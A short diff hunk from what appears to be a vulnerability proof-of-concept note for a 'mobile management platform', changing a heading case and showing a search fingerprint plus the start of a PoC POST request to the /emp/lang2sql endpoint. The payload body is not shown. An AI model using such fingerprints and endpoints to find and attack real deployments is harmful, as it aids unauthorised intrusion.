@@ -6,7 +6,7 @@ web.title="移动管理平台"
 ```
 
 
-## poc
+## POC
 ```
 POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
 Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
